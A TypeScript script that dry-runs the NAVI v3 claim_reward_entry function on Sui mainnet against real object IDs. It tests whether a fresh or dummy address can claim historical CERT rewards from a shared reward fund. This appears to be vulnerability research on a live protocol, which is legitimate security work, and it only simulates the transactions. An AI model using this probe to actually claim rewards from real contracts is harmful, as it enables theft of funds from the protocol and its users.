/**
 * NAVI v3 claim_reward_entry — FINAL vulnerability test
 *
 * Key findings:
 *   - LATEST_PKG: 0x1e4a13a0... (actual current package)
 *   - RewardFund<CERT> is SHARED (anyone can call)
 *   - Correct arg format: Vector<String> = no-0x coin type, Vector<Address> = rule IDs
 *   - Real claimer returns status: success ✓
 *
 * VULNERABILITY HYPOTHESIS: fresh address has user_index=0 in Rule.user_index Table
 * → would claim full historical rewards if claim_reward_entry doesn't check this
 */
import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";
import { bcs } from "@mysten/sui/bcs";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const LATEST_PKG = "0x1e4a13a0494d5facdbe8473e74127b838c2d446ecec0ce262e2eddafa77259cb";
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006";
const INCENTIVE_V3 = "0x62982dad27fb10bb314b3384d5de8d2ac2d72ab2dbeae5d801dbdb9efa816c80";
const STORAGE = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";
const REWARD_FUND_CERT = "0x7093cf7549d5e5b35bfde2177223d1050f71655c7f676a5e610ee70eb4d93b5c";
const CERT_TYPE_FULL = "0x549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55::cert::CERT";
const CERT_TYPE_NORM = "549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55::cert::CERT";
const CERT_RULE_1 = "0xda416fe656205ece152240771fe58b301d0c9a0ae43817b7f0cc0faa2742a60e";

const DUMMY = "0x0000000000000000000000000000000000000000000000000000000000001337";
const REAL_CLAIMER = "0x374e0ef6e83118c22735dbb34d6c762b7bf26197757b6918086bedb65310fab3";
const NAVI_WHALE = "0x7861f12c652dbcf96589413cf5cbc5ebcccd85c2c9f09c25fee76f2a218195c9";

function hexToBytes(hex: string): number[] {
  const bytes: number[] = [];
  for (let i = 0; i < hex.length; i += 2) bytes.push(parseInt(hex.slice(i, i + 2), 16));
  return bytes;
}

async function checkUserIndexInRule(user: string, ruleId: string): Promise<string> {
  // Find rule in CERT pool
  const iv3 = await client.getObject({ id: INCENTIVE_V3, options: { showContent: true } });
  const pools = (iv3.data?.content as any)?.fields?.pools?.fields?.contents ?? [];
  for (const pool of pools) {
    const key = String(pool?.fields?.key ?? "");
    if (key.includes("549e8b69")) {
      const rules = pool?.fields?.value?.fields?.rules?.fields?.contents ?? [];
      for (const r of rules) {
        if (r?.fields?.key === ruleId) {
          const rf = r?.fields?.value?.fields ?? {};
          const tableId = rf.user_index?.fields?.id?.id;
          const globalIdx = rf.global_index ?? "?";
          const enable = rf.enable ?? "?";
          console.log(`    Rule: global_index=${globalIdx} enable=${enable}`);

          if (!tableId) return "no_table";
          try {
            const entry = await client.getDynamicFieldObject({ parentId: tableId, name: { type: "address", value: user } });
            const val = (entry.data?.content as any)?.fields?.value;
            return `user_index=${val ?? "found_null"}`;
          } catch {
            return "NOT_IN_TABLE (defaults to 0)";
          }
        }
      }
    }
  }
  return "rule_not_found";
}

async function dryRunClaim(sender: string, label: string) {
  console.log(`\n=== ${label} ===`);
  console.log(`  Sender: ${sender.slice(0, 26)}...`);

  const idx = await checkUserIndexInRule(sender, CERT_RULE_1);
  console.log(`  user_index in CERT_RULE_1: ${idx}`);

  const tx = new Transaction();
  tx.setSender(sender);

  const coinTypesBcs = bcs.vector(bcs.string()).serialize([CERT_TYPE_NORM]).toBytes();
  const ruleIdsBcs = bcs.vector(bcs.fixedArray(32, bcs.u8())).serialize([
    hexToBytes(CERT_RULE_1.slice(2).padStart(64, "0")),
  ]).toBytes();

  tx.moveCall({
    target: `${LATEST_PKG}::incentive_v3::claim_reward_entry`,
    typeArguments: [CERT_TYPE_FULL],
    arguments: [
      tx.object(CLOCK),
      tx.object(INCENTIVE_V3),
      tx.object(STORAGE),
      tx.object(REWARD_FUND_CERT),
      tx.pure(coinTypesBcs),
      tx.pure(ruleIdsBcs),
    ],
  });

  const r = await client.devInspectTransactionBlock({ transactionBlock: tx, sender });
  const status = r.effects?.status?.status;
  const error = r.effects?.status?.error ?? "";

  if (status === "success") {
    const events = r.events?.filter((e: any) => e.type.includes("RewardClaimed")) ?? [];
    if (events.length > 0) {
      const pj = events[0].parsedJson as any;
      const claimed = BigInt(pj.total_claimed ?? "0");
      const claimedTokens = (Number(claimed) / 1e9).toFixed(6);
      console.log(`  Status: ✅ SUCCESS — RewardClaimed:`);
      console.log(`    user: ${pj.user?.slice(0, 26)}...`);
      console.log(`    total_claimed: ${pj.total_claimed} (${claimedTokens} CERT)`);
      console.log(`    rule_indices: ${JSON.stringify(pj.rule_indices)}`);

      if (claimed === 0n) {
        console.log("  ℹ️  0 claimed → user has existing index OR 0 supply balance");
      } else if (idx.includes("NOT_IN_TABLE")) {
        console.log(`  ⚠️  VULNERABILITY: fresh address with user_index=0 claimed ${claimedTokens} CERT from RewardFund!`);
      }
    } else {
      console.log("  Status: ✅ SUCCESS (no RewardClaimed events — 0 rewards or already claimed)");
    }
  } else {
    console.log(`  Status: ✗ failure`);
    console.log(`  Error: ${error.slice(0, 200)}`);
    const fn = error.match(/function_name: Some\("([^"]+)"\)/)?.[1];
    const code = error.match(/}, (\d+)\)/)?.[1];
    if (fn) console.log(`  → aborted in ${fn}() code=${code}`);
  }
}

async function main() {
  console.log("=".repeat(66));
  console.log("  NAVI v3 claim_reward_entry — Final Vulnerability Assessment");
  console.log("  RewardFund<CERT>: 299,059 CERT | SHARED object");
  console.log("=".repeat(66));

  // Check RewardFund balance
  const rf = await client.getObject({ id: REWARD_FUND_CERT, options: { showContent: true } });
  const bal = (rf.data?.content as any)?.fields?.balance ?? "0";
  console.log(`\nRewardFund<CERT> balance: ${bal} tokens`);

  await dryRunClaim(REAL_CLAIMER, "Real claimer (baseline — should succeed with some value)");
  await dryRunClaim(DUMMY, "DUMMY fresh address (NOT in user_index Table)");
  await dryRunClaim(NAVI_WHALE, "NAVI whale (has real deposits)");

  console.log("\n=".repeat(66));
  console.log("  ANALYSIS:");
  console.log("  - If DUMMY succeeds with total_claimed > 0: VULNERABLE");
  console.log("  - If DUMMY succeeds with total_claimed = 0: SAFE (no balance = no reward)");
  console.log("  - If DUMMY fails: SAFE (protection in place)");
  console.log("=".repeat(66));
}
main().catch(console.error);
